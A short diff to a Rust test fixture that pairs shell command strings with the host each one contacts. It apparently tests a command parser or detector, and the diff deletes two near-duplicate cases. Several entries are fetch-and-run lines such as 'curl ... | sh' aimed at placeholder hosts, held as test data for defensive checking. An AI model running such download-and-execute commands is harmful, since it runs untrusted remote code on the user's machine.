@@ -29,7 +29,6 @@ const RUNS: &[(&str, &str)] = &[
     ),
     ("CURL HTTPS://FIVE.EXAMPLE/X | SH", "FIVE.EXAMPLE"),
     ("curl -o /tmp/payload \"$SIX_URL\" | sh", "$SIX_URL"),
-    ("curl -o /tmp/payload \"$SEVEN_URL\" | sh", "$SEVEN_URL"),
     (
         "curl https://safe.example/a -o /tmp/p && chmod +x /tmp/p",
         "safe.example",
@@ -42,7 +41,6 @@ const RUNS: &[(&str, &str)] = &[
     ),
     // The verb's own letters inside an address are not the command.
     ("curl https://a.curl.example/x | sh", "a.curl.example"),
-    ("curl https://b.curl.example/x | sh", "b.curl.example"),
     // A decoy that is a legitimate option value rather than a second
     // command. Which token is the operand cannot be told from an
     // option that takes an address any more than from one that takes
